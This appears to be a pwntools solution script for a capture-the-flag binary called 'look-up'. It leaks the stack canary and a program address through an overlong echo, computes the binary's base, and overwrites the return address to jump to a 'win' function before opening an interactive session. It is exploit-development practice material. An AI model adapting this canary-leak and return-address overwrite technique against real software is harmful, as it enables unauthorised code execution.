from pwn import *

elf = context.binary = ELF("./look-up")
context.log_level = 'debug'
libc = elf.libc

gs = '''
start
'''
def start():
    global gs
    if args.GDB:
        return gdb.debug(elf.path, gdbscript=gs)
    elif args.REMOTE:
        return remote("0.0.0.0", 5000)
    else:
        return process(elf.path)

io = start()

payload = b'UCTF' + b'A' * 7


io.send(payload)
io.recvuntil(b"You said:")
canary = io.recvline()
canary = list(canary)
canary[11] = 0
canary = canary[11:19]
canary = bytearray(canary)
canary = u64(canary)

print(f"Canary = {hex(canary)}")


payload = b'UCTF' + b'B' * 22
io.send(payload)
io.recvuntil(b"You said:")
addr = io.recvline()
addr = list(addr)
addr = addr[27:27+6]
addr = bytearray(addr).ljust(8, b'\x00')

leaked_addr = u64(addr)

print(f'Vuln Leaked addr: {hex(leaked_addr)}')

base = leaked_addr - 169 - 0x000000000000126f

win_addr = base + 0x0000000000001258

payload = b'A' * 10
payload+= p64(canary)
payload+= b'B' * 8
payload+= p64(win_addr)

io.send(payload)

io.interactive()
